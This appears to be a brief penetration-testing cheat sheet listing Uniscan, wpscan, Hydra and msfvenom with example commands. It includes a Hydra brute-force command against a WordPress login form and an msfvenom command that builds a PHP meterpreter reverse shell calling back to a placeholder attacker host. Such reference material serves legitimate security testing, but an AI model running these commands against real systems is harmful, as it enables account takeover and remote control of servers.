# Application Security Testing Tools

#### Uniscan \(Kali\)

Remote file include \(RFI\), Local file include \(LFI\), and Remote Command Execution \(RCE\) vulnerability scanner

e.g.

```
> uniscan -u http://[hostname]/ -qweds
```

#### wpscan \(Word Press Scanner\)

word press scanner and enumerator

```
> wpscan --url [hostname] --enumerate users
```

#### Hydra

username/password brute forcing 

e.g.

```
hydra [host] http-form-post "/wp-login.php:user=[user]&pass=^PASS^:ERROR" 
    -l [user] 
    -P [dictionary-file]
    -t 10 -w 30
```

#### MSFVenom

metasploit unleashed payload generator

e.g.

```
msfvenom -p php/meterpreter_reverse_tcp LHOST=[yourmachine] LPORT=[port] -f raw >shell.php
```



